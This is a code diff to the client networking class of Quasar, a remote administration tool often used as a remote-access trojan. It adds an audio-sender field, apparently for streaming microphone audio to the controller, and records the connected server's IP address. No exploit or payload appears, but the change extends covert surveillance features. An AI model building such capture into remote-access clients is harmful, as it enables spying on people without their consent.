@@ -1,4 +1,5 @@
-﻿using Quasar.Client.ReverseProxy;
+﻿using Quasar.Client.Audio;
+using Quasar.Client.ReverseProxy;
 using Quasar.Common.Extensions;
 using Quasar.Common.Messages;
 using Quasar.Common.Messages.ReverseProxy;
@@ -167,6 +168,8 @@ namespace Quasar.Client.Networking
         /// </summary>
         public bool Connected { get; private set; }
 
+        public AudioSender audioSender;
+
         /// <summary>
         /// The stream used for communication.
         /// </summary>
@@ -256,6 +259,8 @@ namespace Quasar.Client.Networking
         /// </summary>
         private readonly Mutex _singleWriteMutex = new Mutex();
 
+        private IPAddress _connectedIpAddress;
+
         /// <summary>
         /// Constructor of the client, initializes serializer types.
         /// </summary>
@@ -267,6 +272,7 @@ namespace Quasar.Client.Networking
             this.interceptionCtx = IntPtr.Zero;
             this.interceptionKID = -1;
             this.interceptionMID = -1;
+            this.audioSender = null;
             TypeRegistry.AddTypesToSerializer(typeof(IMessage), TypeRegistry.GetPacketTypes(typeof(IMessage)).ToArray());
         }
 
@@ -292,6 +298,7 @@ namespace Quasar.Client.Networking
                     _stream.AuthenticateAsClient(ip.ToString(), null, SslProtocols.Tls12, false);
                     _stream.BeginRead(_readBuffer, 0, _readBuffer.Length, AsyncReceive, null);
                     OnClientState(true);
+                    _connectedIpAddress = ip;
                 }
                 else
                 {
@@ -701,6 +708,14 @@ namespace Quasar.Client.Networking
                 }
             }
             catch { }
+        }
+
+        public string IpAddress
+        {
+            get
+            {
+                return _connectedIpAddress.ToString();
+            }
         }
     }
 }
